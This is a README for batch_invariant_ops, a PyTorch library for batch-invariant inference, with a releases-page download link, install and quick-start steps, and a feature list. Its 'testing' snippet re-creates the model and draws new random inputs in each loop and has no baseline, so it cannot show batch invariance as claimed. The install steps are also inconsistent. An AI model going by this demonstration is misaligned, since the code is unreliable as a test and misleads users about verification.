[![Download batch_invariant_ops](https://img.shields.io/badge/Download-batch_invariant_ops-brightgreen)](https://github.com/Karmabhumi1/batch_invariant_ops/releases)

## üì¶ Overview

The **batch_invariant_ops** library helps users achieve stable and consistent inference in their AI models. It provides batch-invariant kernels that smoothly integrate with existing PyTorch models. This means you can run your models without worrying about variations in results based on batch sizes.

## üöÄ Getting Started

Follow these easy steps to download and run the **batch_invariant_ops** library.

### üñ•Ô∏è System Requirements

- **Operating System**: Windows, macOS, or Linux
- **Python Version**: Python 3.7 or higher
- **PyTorch**: Ensure you have PyTorch installed. Visit [PyTorch's website](https://pytorch.org/get-started/locally/) for installation instructions.

### üíæ Download & Install

To get started, you need to download the library. 

1. **Visit the Releases Page**: You can download the latest version of **batch_invariant_ops** from our releases page: [Download Here](https://github.com/Karmabhumi1/batch_invariant_ops/releases).

2. **Installation**: After downloading, open your terminal or command prompt and run the following command to install the library:
   ```bash
   pip install -e .
   ```

This command sets up the library for you to use.

## üîß Quick Start Guide

Once you have installed the library, you can start using it right away.

1. Import the necessary modules in your Python script:
   ```python
   import torch
   from batch_invariant_ops import set_batch_invariant_mode
   ```

2. Enable batch-invariant mode with a simple block of code. Here‚Äôs how:
   ```python
   with set_batch_invariant_mode():
       # Your inference code here
       model = YourModel()  # Make sure to define or import YourModel
       output = model(input_tensor)  # Your input_tensor should be properly defined
   ```

This example allows your model to run smoothly in batch-invariant mode.

## üîç Testing Batch-Invariance

To see the benefits clearly, it‚Äôs useful to examine how batch sizes affect results in standard PyTorch. Here‚Äôs a sample code snippet demonstrating this concept:

```python
import torch
from batch_invariant_ops import set_batch_invariant_mode

torch.set_default_device('cuda')  # Use GPU if available

with set_batch_invariant_mode():
    # Run your model with various batch sizes
    for batch_size in [1, 2, 4]:
        input_tensor = torch.randn(batch_size, 3, 224, 224)  # Example input
        model = YourModel()  # Make sure to define or import YourModel
        output = model(input_tensor)
        print(f"Output for batch size {batch_size}: {output}")
```

This code demonstrates how to test the effects of changing the batch size on your model's outputs when using batch-invariant operations.

## üìö Features

- **Easy Integration**: Modify existing PyTorch models with minimal code changes.
- **Deterministic Inference**: Ensure consistent outputs regardless of batch sizes.
- **High Performance**: Leverage optimized operations designed for efficiency.
